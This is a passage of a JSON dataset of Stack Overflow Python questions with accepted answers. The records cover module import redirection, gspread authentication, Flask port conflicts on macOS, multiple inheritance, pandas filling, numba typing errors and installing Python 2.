work.\nref: The issue that lead me to the solution\n\nYou may make your voice heard here in the vscode-python issues\n"
}
{
    "Id": 72235819,
    "PostTypeId": 1,
    "Title": "How can I redirect module imports with modern Python?",
    "Body": "I am maintaining a python package in which I did some restructuring. Now, I want to support clients who still do from my_package.old_subpackage.foo import Foo instead of the new from my_package.new_subpackage.foo import Foo, without explicitly reintroducing many files that do the forwarding.  (old_subpackage still exists, but no longer contains foo.py.)\nI have learned that there are \"loaders\" and \"finders\", and my impression was that I should implement a loader for my purpose, but I only managed to implement a finder so far:\nRENAMED_PACKAGES = {\n    'my_package.old_subpackage.foo': 'my_package.new_subpackage.foo',\n}\n\n# TODO: ideally, we would not just implement a \"finder\", but also a \"loader\"\n# (using the importlib.util.module_for_loader decorator); this would enable us\n# to get module contents that also pass identity checks\nclass RenamedFinder:\n\n    @classmethod\n    def find_spec(cls, fullname, path, target=None):\n        renamed = RENAMED_PACKAGES.get(fullname)\n        if renamed is not None:\n            sys.stderr.write(\n                f'WARNING: {fullname} was renamed to {renamed}; please adapt import accordingly!\\n')\n            return importlib.util.find_spec(renamed)\n        return None\n\nsys.meta_path.append(RenamedFinder())\n\nhttps://docs.python.org/3.5/library/importlib.html#importlib.util.module_for_loader and related functionality, however, seem to be deprecated.  I know it's not a very pythonic thing I am trying to achieve, but I would be glad to learn that it's achievable.\n",
    "AcceptedAnswerId": 72244240,
    "AcceptedAnswer": "On import of your package's __init__.py, you can place whatever objects you want into sys.modules, the values you put in there will be returned by import statements:\nfrom . import new_package\nfrom .new_package import module1, module2\nimport sys\n\nsys.modules[\"my_lib.old_package\"] = new_package\nsys.modules[\"my_lib.old_package.module1\"] = module1\nsys.modules[\"my_lib.old_package.module2\"] = module2\n\nIf someone now uses import my_lib.old_package or import my_lib.old_package.module1 they will obtain a reference to my_lib.new_package.module1. Since the import machinery already finds the keys in the sys.modules dictionary, it never even begins looking for the old files.\nIf you want to avoid importing all the submodules immediately, you can emulate a bit of lazy loading by placing a module with a __getattr__ in sys.modules:\nfrom types import ModuleType\nimport importlib\nimport sys\n\nclass LazyModule(ModuleType):\n def __init__(self, name, mod_name):\n  super().__init__(name)\n  self.__mod_name = name\n\n def __getattr__(self, attr):\n  if \"_lazy_module\" not in self.__dict__:\n    self._lazy_module = importlib.import(self.__mod_name, package=\"my_lib\")\n  return self._lazy_module.__getattr__(attr)\n\nsys.modules[\"my_lib.old_package\"] = LazyModule(\"my_lib.old_package\", \"my_lib.new_package\")\n\n"
}
{
    "Id": 71686960,
    "PostTypeId": 1,
    "Title": "TypeError: Credentials need to be from either oauth2client or from google-auth",
    "Body": "I'm new to python and currently is working on a project that requires me to export pandas data frame from google collab to a google spreadsheet with multiple tabs. Previously when I run this specific code, there are no errors but then now it shows an error like this:\n    TypeError                                 Traceback (most recent call last)\n in ()\n      5 gauth.credentials = GoogleCredentials.get_application_default()\n      6 drive = GoogleDrive(gauth)\n----> 7 gc = gspread.authorize(GoogleCredentials.get_application_default())\n\n2 frames\n/usr/local/lib/python3.7/dist-packages/gspread/utils.py in convert_credentials(credentials)\n     59 \n     60     raise TypeError(\n---> 61         'Credentials need to be from either oauth2client or from google-auth.'\n     62     )\n     63 \n\nTypeError: Credentials need to be from either oauth2client or from google-auth.\n\nHere is the code that I use to create authentication.\n#Import PyDrive and associated libraries.\n#This only needs to be done once per notebook.\n\nfrom pydrive.auth import GoogleAuth\nfrom pydrive.drive import GoogleDrive\nfrom google.colab import auth\nfrom oauth2client.client import GoogleCredentials\nimport gspread\n\n#Authenticate and create the PyDrive client.\n#This only needs to be done once per notebook.\nauth.authenticate_user()\ngauth = GoogleAuth()\ngauth.credentials = GoogleCredentials.get_application_default()\ndrive = GoogleDrive(gauth)\ngc = gspread.authorize(GoogleCredentials.get_application_default())\n\nAny help would be much appreciated.\n",
    "AcceptedAnswerId": 71711274,
    "AcceptedAnswer": "I had the same problem today and found this answer: https://github.com/burnash/gspread/issues/1014#issuecomment-1082536016\nI finally solved it by replacing the old code with this one:\nfrom google.colab import auth\nauth.authenticate_user()\n\nimport gspread\nfrom google.auth import default\ncreds, _ = default()\n\ngc = gspread.authorize(creds)\n\n"
}
{
    "Id": 72795799,
    "PostTypeId": 1,
    "Title": "How to solve 403 error with Flask in Python?",
    "Body": "I made a simple server using python flask in mac. Please find below the code.\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef hello():\n    print(\"request received\")\n    return \"Hello world!\"\n\n    \nif __name__ == \"__main__\":\n    app.run(debug=True)\n\nI run it using python3 main.py command.\nWhile calling above API on url  http://localhost:5000/ from Postman using GET / POST method, it always returns http 403 error.\n\nPython version : 3.8.9\nOS : Mac OS 12.4\nFlask : 2.1.2\n\n",
    "AcceptedAnswerId": 72797062,
    "AcceptedAnswer": "Mac OSX Monterey (12.x) currently uses ports 5000 and 7000 for its Control centre hence the issue.\nTry running your app from port other than 5000 and 7000\nuse this:\nif __name__ == \"__main__\":\n    app.run(port=8000, debug=True)\n\nand then run your flask file, eg: app.py\npython app.py\nYou can also run using the flask command line interface using this command provided you have set the environment variable necessary for flask CLI.\nflask run --port 8000\nYou can also turn off AirPlay Receiver in the Sharing via System Preference.\nRelated discussion here: https://developer.apple.com/forums/thread/682332\nUpdate(November 2022):\nMac OSX Ventura(13.x) still has this problem and is fixed with the change in default port as mentioned above.\n"
}
{
    "Id": 72824468,
    "PostTypeId": 1,
    "Title": "pip installing environment.yml as if it's a requirements.txt",
    "Body": "I have an environment.yml file, but don't want to use Conda:\nname: foo\nchannels:\n  - defaults\ndependencies:\n  - matplotlib=2.2.2\n\nIs it possible to have pip install the dependencies inside an environment.yml file as if it's a requirements.txt file?\nI tried pip install -r environment.yml and it doesn't work with pip==22.1.2.\n",
    "AcceptedAnswerId": 72824497,
    "AcceptedAnswer": "No, pip does not support this format. The format it expects for a requirements file is documented here. You'll have to convert the environment.yml file to a requirements.txt format either manually or via a script that automates this process. However, keep in mind that not all packages on Conda will be available on PyPI.\n"
}
{
    "Id": 72299007,
    "PostTypeId": 1,
    "Title": "How to create instance of multiple inherited class?",
    "Body": "I have this code:\nclass Person:\n    def __init__(self, name, last_name, age):\n        self.name = name\n        self.last_name = last_name\n        self.age = age \n\nclass Student(Person):\n    def __init__(self, name, last_name, age, indexNr, notes):\n        super().__init__(name, last_name, age)\n        self.indexNr = indexNr\n        self.notes = notes\n\nclass Employee(Person):\n    def __init__(self, name, last_name, age, salary, position):\n        super().__init__(name, last_name, age)\n        self.salary = salary\n        self.position = position\n\nclass WorkingStudent(Student, Employee):\n    def __init__(self, name, last_name, age, indexNr, notes, salary, position):\n        Student.__init__(name, last_name, age, indexNr, notes)\n        Employee.__init__(name, last_name, age, salary, position)\n\nI want to create a WorkingStudent instance like this:\nws = WorkingStudent(\"john\", \"brown\", 18, 1, [1,2,3], 1000, 'Programmer')\n\nbut it's not working, I get this error:\nTypeError: __init__() missing 1 required positional argument: 'notes'\n\nOr what I am doing wrong here? Also, I have already tried super() in WorkingStudent class but it calls only the constructor of the first passed class. i.e in this case Student\nNote: I have already gone through multiple StackOverflow queries but I couldn't find anything that could answer this. (or maybe I have missed).\n",
    "AcceptedAnswerId": 72299178,
    "AcceptedAnswer": "Instead of explicit classes, use super() to pass arguments along the mro:\nclass Person:\n    def __init__(self, name, last_name, age):\n        self.name = name\n        self.last_name = last_name\n        self.age = age \n\nclass Student(Person):\n    def __init__(self, name, last_name, age, indexNr, notes, salary, position):\n        # since Employee comes after Student in the mro, pass its arguments using super\n        super().__init__(name, last_name, age, salary, position)\n        self.indexNr = indexNr\n        self.notes = notes\n\nclass Employee(Person):\n    def __init__(self, name, last_name, age, salary, position):\n        super().__init__(name, last_name, age)\n        self.salary = salary\n        self.position = position\n\nclass WorkingStudent(Student, Employee):\n    def __init__(self, name, last_name, age, indexNr, notes, salary, position):\n        # pass all arguments along the mro\n        super().__init__(name, last_name, age, indexNr, notes, salary, position)\n\n# uses positional arguments            \nws = WorkingStudent(\"john\", \"brown\", 18, 1, [1,2,3], 1000, 'Programmer')\n# then you can print stuff like\nprint(f\"My name is {ws.name} {ws.last_name}. I'm a {ws.position} and I'm {ws.age} years old.\")\n# My name is john brown. I'm a Programmer and I'm 18 years old.\n\nCheck mro:\nWorkingStudent.__mro__\n(__main__.WorkingStudent,\n __main__.Student,\n __main__.Employee,\n __main__.Person,\n object)\n\n\nWhen you create an instance of WorkingStudent, it's better if you pass keyword arguments so that you don't have to worry about messing up the order of arguments.\nSince WorkingStudent defers the definition of attributes to parent classes, immediately pass all arguments up the hierarchy using super().__init__(**kwargs) since a child class doesn't need to know about the parameters it doesn't handle. The first parent class is Student, so self.IndexNr etc are defined there. The next parent class in the mro is Employee, so from Student, pass the remaining keyword arguments to it, using super().__init__(**kwargs) yet again. From Employee, define the attributes defined there and pass the rest along the mro (to Person) via super().__init__(**kwargs) yet again.\nclass Person:\n    def __init__(self, name, last_name, age):\n        self.name = name\n        self.last_name = last_name\n        self.age = age \n\nclass Student(Person):\n    def __init__(self, indexNr, notes, **kwargs):\n        # since Employee comes after Student in the mro, pass its arguments using super\n        super().__init__(**kwargs)\n        self.indexNr = indexNr\n        self.notes = notes\n\nclass Employee(Person):\n    def __init__(self, salary, position, **kwargs):\n        super().__init__(**kwargs)\n        self.salary = salary\n        self.position = position\n\nclass WorkingStudent(Student, Employee):\n    def __init__(self, **kwargs):\n        # pass all arguments along the mro\n        super().__init__(**kwargs)\n\n# keyword arguments (not positional arguments like the case above)\nws = WorkingStudent(name=\"john\", last_name=\"brown\", age=18, indexNr=1, notes=[1,2,3], salary=1000, position='Programmer')\n\n"
}
{
    "Id": 71886600,
    "PostTypeId": 1,
    "Title": "Algorithm for ordering data so that neighbor elements are as identical as possible",
    "Body": "I have a (potentially large) list data of 3-tuples of small non-negative integers, like\ndata = [\n    (1, 0, 5),\n    (2, 4, 2),\n    (3, 2, 1),\n    (4, 3, 4),\n    (3, 3, 1),\n    (1, 2, 2),\n    (4, 0, 3),\n    (0, 3, 5),\n    (1, 5, 1),\n    (1, 5, 2),\n]\n\nI want to order the tuples within data so that neighboring tuples (data[i] and data[i+1]) are \"as similar as possible\".\nDefine the dissimilarity of two 3-tuples as the number of elements which are unequal between them. E.g.\n\n(0, 1, 2) vs. (0, 1, 2): Dissimilarity 0.\n(0, 1, 2) vs. (0, 1, 3): Dissimilarity 1.\n(0, 1, 2) vs. (0, 2, 1): Dissimilarity 2.\n(0, 1, 2) vs. (3, 4, 5): Dissimilarity 3.\n(0, 1, 2) vs. (2, 0, 1): Dissimilarity 3.\n\nQuestion: What is a good algorithm for finding the ordering of data which minimizes the sum of dissimilarities between all neighboring 3-tuples?\nSome code\nHere's a function which computes the dissimilarity between two 3-tuples:\ndef dissimilar(t1, t2):\n    return sum(int(a != b) for a, b in zip(t1, t2))\n\nHere's a function which computes the summed total dissimilarity of data, i.e. the number which I seek to minimize:\ndef score(data):\n    return sum(dissimilar(t1, t2) for t1, t2 in zip(data, data[1:]))\n\nThe problem can be solved by simply running score() over every permutation of data:\nimport itertools\nn_min = 3*len(data)  # some large number\nfor perm in itertools.permutations(data):\n    n = score(perm)\n    if n < n_min:\n        n_min = n\n        data_sorted = list(perm)\nprint(data_sorted, n_min)\n\nThough the above works, it's very slow as we explicitly check each and every permutation (resulting in O(N!) complexity). On my machine the above takes about 20 seconds when data has 10 elements.\nFor completeness, here's the result of running the above given the example data:\ndata_sorted = [\n    (1, 0, 5),\n    (4, 0, 3),\n    (4, 3, 4),\n    (0, 3, 5),\n    (3, 3, 1),\n    (3, 2, 1),\n    (1, 5, 1),\n    (1, 5, 2),\n    (1, 2, 2),\n    (2, 4, 2),\n]\n\nwith n_min = 15. Note that several other orderings (10 in total) with a score of 15 exist. For my purposes these are all equivalent and I just want one of them.\nFinal remarks\nIn practice the size of data may be as large as say 10000.\nThe sought-after algorithm should beat O(N!), i.e. probably be polynomial in time (and space).\nIf no such algorithm exists, I would be interested in \"near-solutions\", i.e. a fast algorithm which gives an ordering of data with a small but not necessarily minimal total score. One such algorithm would be lexicographic sorting, i.e.\nsorted(data)  # score 18\n\nthough I hope to be able to do better than this.\nEdit (comments on accepted solution)\nI have tried all of the below heuristic solutions given as code (I have not tried e.g. Google OR-tools). For large len(data), I find that the solution of Andrej Kesely is both quick and gives the best results.\nThe idea behind this method is quite simple. The sorted list of data elements (3-tuples) is built up one by one. Given some data element, the next element is chosen to be the most similar one out of the remaining (not yet part of the sorted) data.\nEssentially this solves a localized version of the problem where we only \"look one ahead\", rather than optimizing globally over the entire data set. We can imagine a hierarchy of algorithms looking n ahead, each successively delivering better (or at least as good) results but at the cost of being much more expensive. The solution of Andrej Kesely then sits lowest in this hierarchy. The algorithm at the highest spot, looking len(data) ahead, solves the problem exactly.\nLet's settle for \"looking 1 ahead\", i.e. the answer by Andrej Kesely. This leaves room for a) the choice of initial element, b) what to do when several elements are equally good candidates (same dissimilarity) for use as the next one. Choosing the first element in data as the initial element and the first occurrence of an element with minimal dissimilarity, both a) and b) are determined from the original order of elements within data. As Andrej Kesely points out, it then helps to (lex)sort data in advance.\nIn the end I went with this solution, but refined in a few ways:\n\nI try out the algorithm for 6 initial sortings of data; lex sort for columns (0, 1, 2), (2, 0, 1), (1, 2, 0), all in ascending as well as descending order.\nFor large len(data), the algorithm becomes too slow for me. I suspect it scales like O(n\u00b2). I thus process chunks of the data of size n_max independently, with the final result being the different sorted chunks concatenated. Transitioning from one chunk to the next we expect a dissimilarity of 3, but this is unimportant if we keep n_max large. I go with n_max = 1000.\n\nAs an implementation note, the performance can be improved by not using data.pop(idx) as this itself is O(n). Instead, either leave the original data as is and use another data structure for keeping track of which elements/indices have been used, or replace data[idx] with some marker value upon use.\n",
    "AcceptedAnswerId": 71890278,
    "AcceptedAnswer": "This isn't exact algorithm, just heuristic, but should be better that naive sorting:\n# you can sort first the data for lower total average score:\n# data = sorted(data)\n\nout = [data.pop(0)]\nwhile data:\n    idx, t = min(enumerate(data), key=lambda k: dissimilar(out[-1], k[1]))\n    out.append(data.pop(idx))\n\n\nprint(score(out))\n\n\nTesting (100 repeats with data len(data)=1000):\nimport random\nfrom functools import lru_cache\n\n\ndef get_data(n=1000):\n    f = lambda n: random.randint(0, n)\n    return [(f(n // 30), f(n // 20), f(n // 10)) for _ in range(n)]\n\n\n@lru_cache(maxsize=None)\ndef dissimilar(t1, t2):\n    a, b, c = t1\n    x, y, z = t2\n    return (a != x) + (b != y) + (c != z)\n\n\ndef score(data):\n    return sum(dissimilar(t1, t2) for t1, t2 in zip(data, data[1:]))\n\n\ndef lexsort(data):\n    return sorted(data)\n\n\ndef heuristic(data, sort_data=False):\n    data = sorted(data) if sort_data else data[:]\n    out = [data.pop(0)]\n    while data:\n        idx, t = min(enumerate(data), key=lambda k: dissimilar(out[-1], k[1]))\n        out.append(data.pop(idx))\n    return out\n\n\nN, total, total_lexsort, total_heuristic, total_heuristic2 = 100, 0, 0, 0, 0\nfor i in range(N):\n    data = get_data()\n    r0 = score(data)\n    r1 = score(lexsort(data))\n    r2 = score(heuristic(data))\n    r3 = score(heuristic(data, True))\n    print(\"original data\", r0)\n    print(\"lexsort\", r1)\n    print(\"heuristic\", r2)\n    print(\"heuristic with sorted\", r3)\n\n    total += r0\n    total_lexsort += r1\n    total_heuristic += r2\n    total_heuristic2 += r3\n\nprint(\"total original data score\", total)\nprint(\"total score lexsort\", total_lexsort)\nprint(\"total score heuristic\", total_heuristic)\nprint(\"total score heuristic(with sorted)\", total_heuristic2)\n\nPrints:\n...\n\ntotal original data score 293682\ntotal score lexsort 178240\ntotal score heuristic 162722\ntotal score heuristic(with sorted) 160384\n\n"
}
{
    "Id": 72312594,
    "PostTypeId": 1,
    "Title": "Pandas forward fill, but only between equal values",
    "Body": "I have two data frames: main and auxiliary. I am concatenating auxiliary to the main. It results in NaN in a few rows and I want to fill them, not all.\nCode:\ndf1 = pd.DataFrame({'Main':[00,10,20,30,40,50,60,70,80]})\ndf1 = \n   Main\n0     0\n1    10\n2    20\n3    30\n4    40\n5    50\n6    60\n7    70\n8    80\ndf2 = pd.DataFrame({'aux':['aa','aa','bb','bb']},index=[0,2,5,7])\ndf2 = \n  aux\n0   aa  \n2   aa\n5   bb\n7   bb\ndf = pd.concat([df1,df2],axis=1)\n# After concating, in the aux column, I want to fill the NaN rows in between \n# the rows with same value. Example, fill rows between 0 and 2 with 'aa', 2 and 5 NaN, 5 and 7 with 'bb'\ndf = pd.concat([df1,df2],axis=1).fillna(method='ffill')\nprint(df)\n\nPresent result:\n  Main aux\n0    0   aa\n1   10   aa\n2   20   aa\n3   30   aa # Wrong, here it should be NaN\n4   40   aa # Wrong, here it should be NaN\n5   50   bb \n6   60   bb\n7   70   bb\n8   80   bb # Wrong, here it should be NaN\n\nExpected result:\n  Main aux\n0    0   aa\n1   10   aa\n2   20   aa\n3   30  NaN\n4   40  NaN\n5   50   bb\n6   60   bb\n7   70   bb\n8   80  NaN\n\n",
    "AcceptedAnswerId": 72312653,
    "AcceptedAnswer": "If I understand correctly, what you want can be done like this. You want to fill the NaNs where backfill and forward fill give the same value.\nff = df.aux.ffill()\nbf = df.aux.bfill()\ndf.aux = ff[ff == bf]\n\n"
}
{
    "Id": 71709229,
    "PostTypeId": 1,
    "Title": "VSCode debugger can not import queue due to shadowing",
    "Body": "When I try to run any python code in debug mode using VScode, I got an error message saying:\n42737 -- /home//Desktop/development/bopi/experiment_handler.py .vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/launcher 4\nTraceback (most recent call last):\n  File \"/usr/lib/python2.7/runpy.py\", line 174, in _run_module_as_main\n    \"__main__\", fname, loader, pkg_name)\n  File \"/usr/lib/python2.7/runpy.py\", line 72, in _run_code\n    exec code in run_globals\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/__main__.py\", line 43, in \n    from debugpy.server import cli\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/../debugpy/server/__init__.py\", line 9, in \n    import debugpy._vendored.force_pydevd  # noqa\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/../debugpy/_vendored/force_pydevd.py\", line 37, in \n    pydevd_constants = import_module('_pydevd_bundle.pydevd_constants')\n  File \"/usr/lib/python2.7/importlib/__init__.py\", line 37, in import_module\n    __import__(name)\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/_vendored/pydevd/_pydevd_bundle/pydevd_constants.py\", line 362, in \n    from _pydev_bundle._pydev_saved_modules import thread, threading\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/_vendored/pydevd/_pydev_bundle/_pydev_saved_modules.py\", line 97, in \n    import queue as _queue;    verify_shadowed.check(_queue, ['Queue', 'LifoQueue', 'Empty', 'Full', 'deque'])\n  File \"/home//.vscode-server/extensions/ms-python.python-2022.4.0/pythonFiles/lib/python/debugpy/_vendored/pydevd/_pydev_bundle/_pydev_saved_modules.py\", line 75, in check\n    raise DebuggerInitializationError(msg)\n_pydev_bundle._pydev_saved_modules.DebuggerInitializationError: It was not possible to initialize the debugger due to a module name conflict.\n\ni.e.: the module \"queue\" could not be imported because it is shadowed by:\n/home//.local/lib/python2.7/site-packages/queue/__init__.pyc\nPlease rename this file/folder so that the original module from the standard library can be imported.\n\nDeleting the init.pyc and init.py resulting with an error message about missing queue import.\n",
    "AcceptedAnswerId": 71711905,
    "AcceptedAnswer": "Downgrading my Python extension in Visual Studio Code to v2022.2.1924087327 worked for me.\nElevating @Onur Berk's comment below as part of the answer:\n\nIts is very easy to downgrade the python extension, just click 'extensions' and find the Python extension and select it. Rather than clicking 'uninstall' click the arrow next to it, this will give you an option to install another version\n\n"
}
{
    "Id": 71902946,
    "PostTypeId": 1,
    "Title": "numba: No implementation of function Function(<built-in function getitem>) found for signature:",
    "Body": "I\u00b4m having a hard time implementing numba to my function.\nBasically, I`d like to concatenate to arrays with 22 columns, if the new data hasn't been added yet. If there is no old data, the new data should become a 2d array.\nThe function works fine without the decorator:\n@jit(nopython=True)\ndef add(new,original=np.array([])):\n  duplicate=True\n  if original.size!=0:\n    for raw in original:\n      for ii in range(11,19):\n        if raw[ii]!=new[ii]:\n          duplicate=False\n    if duplicate==False:\n      res=np.zeros((original.shape[0]+1,22))\n      res[:original.shape[0]]=original\n      res[-1]=new\n      return res\n    else:\n      return original\n  else:\n    res=np.zeros((1,22))\n    res[0]=new\n    return res\n\nAlso if I remove the last part of the code:\n  else:\n    res=np.zeros((1,22))\n    res[0]=new\n    return res\n\nIt would work with njit\nSo if I ignore the case, that there hasn\u00b4t been old data yet, everything would be fine.\nFYI: the data I`m passing in is mixed float and np.nan.\nAnybody an idea?\nThank you so much in advance!\nthis is my error log:\n---------------------------------------------------------------------------\nTypingError                               Traceback (most recent call last)\n in ()\n     19     return res\n     20 #add(a,np.array([b]))\n---> 21 add(a)\n\n2 frames\n/usr/local/lib/python3.7/dist-packages/numba/core/dispatcher.py in _compile_for_args(self, *args, **kws)\n    413                 e.patch_message(msg)\n    414 \n--> 415             error_rewrite(e, 'typing')\n    416         except errors.UnsupportedError as e:\n    417             # Something unsupported is present in the user code, add help info\n\n/usr/local/lib/python3.7/dist-packages/numba/core/dispatcher.py in error_rewrite(e, issue_type)\n    356                 raise e\n    357             else:\n--> 358                 reraise(type(e), e, None)\n    359 \n    360         argtypes = []\n\n/usr/local/lib/python3.7/dist-packages/numba/core/utils.py in reraise(tp, value, tb)\n     78         value = tp()\n     79     if value.__traceback__ is not tb:\n---> 80         raise value.with_traceback(tb)\n     81     raise value\n     82 \n\nTypingError: Failed in nopython mode pipeline (step: nopython frontend)\nNo implementation of function Function() found for signature:\n \n >>> getitem(float64, int64)\n \nThere are 22 candidate implementations:\n      - Of which 22 did not match due to:\n      Overload of function 'getitem': File: : Line N/A.\n        With argument(s): '(float64, int64)':\n       No match.\n\nDuring: typing of intrinsic-call at  (7)\n\nFile \"\", line 7:\ndef add(new,original=np.array([])):\n    \n      for ii in range(11,19):\n        if raw[ii]!=new[ii]:\n        ^\n\nUpdate:\nHere is how it should work. The function shall cover three main cases\nsample input for new data (1d array):\narray([9.0000000e+00, 0.0000000e+00, 1.0000000e+00, 0.0000000e+00,\n       0.0000000e+00,           nan, 5.7300000e-01, 9.2605450e-01,\n       9.3171725e-01, 9.2039175e-01, 9.3450000e-01, 1.6491636e+09,\n       1.6494228e+09, 1.6496928e+09, 1.6497504e+09, 9.2377000e-01,\n       9.3738000e-01, 9.3038000e-01, 9.3450000e-01,           nan,\n                 nan,           nan])\n\nsample input for original data (2d array):\narray([[4.00000000e+00, 0.00000000e+00, 1.00000000e+00, 0.00000000e+00,\n        0.00000000e+00,            nan, 5.23000000e-01, 8.31589755e-01,\n        8.34804877e-01, 8.28374632e-01, 8.36090000e-01, 1.64938320e+09,\n        1.64966400e+09, 1.64968920e+09, 1.64975760e+09, 8.30750000e-01,\n        8.38020000e-01, 8.34290000e-01, 8.36090000e-01,            nan,\n                   nan,            nan]])\n\n\nnew data will be added and there is no original data\n\nadd(new)\nOutput:\n\narray([[9.0000000e+00, 0.0000000e+00, 1.0000000e+00, 0.0000000e+00,\n        0.0000000e+00,           nan, 5.7300000e-01, 9.2605450e-01,\n        9.3171725e-01, 9.2039175e-01, 9.3450000e-01, 1.6491636e+09,\n        1.6494228e+09, 1.6496928e+09, 1.6497504e+09, 9.2377000e-01,\n        9.3738000e-01, 9.3038000e-01, 9.3450000e-01,           nan,\n                  nan,           nan]])\n\n\nnew data will be added, which hasn\u00b4t already been added before and there is original data\n\nadd(new,original)\nOutput:\narray([[4.00000000e+00, 0.00000000e+00, 1.00000000e+00, 0.00000000e+00,\n        0.00000000e+00,            nan, 5.23000000e-01, 8.31589755e-01,\n        8.34804877e-01, 8.28374632e-01, 8.36090000e-01, 1.64938320e+09,\n        1.64966400e+09, 1.64968920e+09, 1.64975760e+09, 8.30750000e-01,\n        8.38020000e-01, 8.34290000e-01, 8.36090000e-01,            nan,\n                   nan,            nan],\n       [9.00000000e+00, 0.00000000e+00, 1.00000000e+00, 0.00000000e+00,\n        0.00000000e+00,            nan, 5.73000000e-01, 9.26054500e-01,\n        9.31717250e-01, 9.20391750e-01, 9.34500000e-01, 1.64916360e+09,\n        1.64942280e+09, 1.64969280e+09, 1.64975040e+09, 9.23770000e-01,\n        9.37380000e-01, 9.30380000e-01, 9.34500000e-01,            nan,\n                   nan,            nan]])\n\n\n\nnew data will be added, which already had been added before\n\nadd(new,original)\nOutput:\n\narray([[9.0000000e+00, 0.0000000e+00, 1.0000000e+00, 0.0000000e+00,\n        0.0000000e+00,           nan, 5.7300000e-01, 9.2605450e-01,\n        9.3171725e-01, 9.2039175e-01, 9.3450000e-01, 1.6491636e+09,\n        1.6494228e+09, 1.6496928e+09, 1.6497504e+09, 9.2377000e-01,\n        9.3738000e-01, 9.3038000e-01, 9.3450000e-01,           nan,\n                  nan,           nan]])\n\n",
    "AcceptedAnswerId": 71903983,
    "AcceptedAnswer": "The main issue is that Numba assumes that original is a 1D array while this is not the case. The pure-Python code works because the interpreter it never execute the body of the loop for raw in original but Numba need to compile all the code before its execution. You can solve this problem using the following function prototype:\ndef add(new,original=np.array([[]])):  # Note the `[[]]` instead of `[]`\n\nWith that, Numba can deduce correctly that the original array is a 2D one.\nNote that specifying the dimension and types of Numpy arrays and inputs is a good method to avoid such errors and sneaky bugs (eg. due to integer/float truncation).\n"
}
{
    "Id": 71735869,
    "PostTypeId": 1,
    "Title": "How to reduce number if-statements using dict?",
    "Body": "I have the following code with multiple cases:\ndef _extract_property_value(selector: Selector) -> str:\n    raw_value = selector.xpath(\"span[2]\")\n\n    default_value = raw_value.xpath(\"./text()\").get().strip()\n    value_with_a = ', '.join([value.strip() for value in raw_value.xpath(\"./a /text()\").getall()])\n    value_with_div_and_a = ', '.join([value.strip() for value in raw_value.xpath(\"./div /a /text()\").getall()])\n\n    if value_with_a:\n        return value_with_a\n    elif value_with_div_and_a:\n        return value_with_div_and_a\n    elif default_value:\n        return default_value\n\nI want to get rid of if-statements and simplify this code as much as it is possible. I am not good Pyton dev. I know there is pattern \"strategy\" and below I was trying to implement that:\ndef _extract_property_value(selector: Selector) -> str:\n    raw_value = selector.xpath(\"span[2]\")\n    values_dict = {\n        'default value': raw_value.xpath(\"./text()\").get().strip(),\n        'value with a': ', '.join([value.strip() for value in raw_value.xpath(\"./a /text()\").getall()]),\n        'value with div and a': ', '.join([value.strip() for value in raw_value.xpath(\"./div /a /text()\").getall()])\n    }\n    return [item for item in values_dict.values() if item != ''][0]\n\nbut... Now when I think of this - that was bad idea to use strategy there. I am not sure. Can someone help me to simplify that code? Or those if-statements are just necessary.\n",
    "AcceptedAnswerId": 71736271,
    "AcceptedAnswer": "We can reduce the number of if statements but without the aid of a dictionary.\nThe code in question unconditionally assigns values to 3 variables. Having done so, those variables are examined to determine which, if any, is to be returned to the caller. However, there are no dependencies between those variables. Therefore they could be processed in order of priority and, if an appropriate value is acquired, then it could be returned immediately thereby making the process considerably more efficient.\ndef _extract_property_value(selector):\n    def f1(rv):\n        return rv.xpath(\"./text()\").get().strip()\n    def f2(rv):\n        return ', '.join([value.strip() for value in rv.xpath(\"./a /text()\").getall()])\n    def f3(rv):\n        return ', '.join([value.strip() for value in rv.xpath(\"./div /a /text()\").getall()])\n    raw_value = selector.xpath(\"span[2]\")\n    for func in [f2, f3, f1]: # note the priority order - default last\n        if (v := func(raw_value)):\n            return v\n\nThe revised function will implicitly return None if suitable values are not found. In this respect it is no different to the OP's original code\n"
}
{
    "Id": 71739870,
    "PostTypeId": 1,
    "Title": "How to install Python 2 on macOS 12.3+",
    "Body": "macOS 12.3 update drops Python 2 and replaces it with version 3:\nhttps://developer.apple.com/documentation/macos-release-notes/macos-12_3-release-notes\n\nPython\nDeprecations\nPython 2.7 was removed from macOS in this update. Developers should use Python 3 or an alternative language instead. (39795874)\n\nI understand we need to migrate to version 3, but in the meantime we still need version 2. Homebrew does not seem to have it anymore:\nbrew install python@2.7\nWarning: No available formula with the name \"python@2.7\". Did you mean python@3.7, python@3.9, python@3.8, python@3.10 or python-yq?\n\nbrew install python2\nWarning: No available formula with the name \"python2\". Did you mean ipython, bpython, jython or cython?\n\nWhat gives?\n",
    "AcceptedAnswerId": 71740144,
    "AcceptedAnswer": "You can get any Python release, including the last Python 2, from the official download site:\nhttps://www.python.org/downloads/release/python-2718/ \u2192 macOS 64-bit installer\n"
}
{
    "Id": 72204649,
    "PostTypeId": 1,
    "Title": "Single-file history format/library for binary files?",
    "Body": "My application is going to edit a bunch of large files, completely unrelated to each other (belonging to different users), and I need to store checkpoints of the previous state of the files.  Delta compression should work extremely well on this file format.  I only need a linear history, not branches or merges.\nThere are low-level libraries that give part of the solution, for example xdelta3 sounds like a good binary diff/patch system.\nRCS actually seems like a pretty close match to my problem, but doesn't handle binary files well.\ngit provides a complete solution to my problem, but is an enormous suite of programs, and its storage format is an entire directory.\nIs there anything less complicated than git that would:\n\nwork on binary files\nperform delta compression\nlet me commit new \"newest\" versions\nlet me recall old versions\n\nBonus points if it would:\n\nhave a single-file storage format\nbe available as a C, C++, or Python library\n\nI can't even find the right combination of words to google for this category of program, so that would also be helpful.\n",
    "AcceptedAnswerId": 72343489,
